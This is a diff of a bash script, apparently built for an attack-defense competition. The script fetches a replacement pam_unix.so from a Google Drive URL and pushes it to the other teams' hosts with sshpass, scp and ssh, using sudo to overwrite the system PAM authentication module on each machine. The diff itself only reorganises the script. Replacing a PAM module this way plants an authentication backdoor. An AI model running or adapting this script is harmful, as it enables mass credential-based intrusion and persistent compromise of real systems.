@@ -9,16 +9,16 @@ path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
 path_to_tmp_pam="/tmp/pam_unix.so"
 link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
-IPs=()
 network_id="1.1"
 number_of_teams=10
 my_team=5
 host_ids=(1 2 3)
 
 main() {
-    sudo apt install -y curl sshpass
     curl -o "$path_to_tmp_pam" "$link_to_pam"
     sleep 5
+
+    local IPs=()
     for ((team=1; team<=number_of_teams; team++)); do
         if [[ $team -eq $my_team ]]; then
             continue
@@ -27,7 +27,8 @@ main() {
             IPs+=("$network_id.$team.$host_id")
         done
     done
-    job_count=0
+
+    local job_count=0
     for IP in "${IPs[@]}"; do
         {
             sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
@@ -37,14 +38,16 @@ main() {
                     echo \"$password\" | sudo -S apt install -y curl || \
                     echo \"$password\" | sudo -S yum install -y curl || \
                     echo \"$password\" | sudo -S zypper install -y curl || \
-                    echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \        
-                    sleep 5 && \
-                    echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
-                    sleep 5 && \
+                    echo \"$password\" | sudo -S pacman -Syu curl --noconfirm
+                    sleep 5
+                    echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\"
+                    sleep 5
                     echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
                 " && \
                 echo "SUCCESS (CURL): $IP" || \
-                echo "FAIL    (CURL): $IP"
+                echo -e "\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n" \
+                        "FAIL    (CURL): $IP !!\n" \
+                        "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
             }
         } &
         ((job_count++))
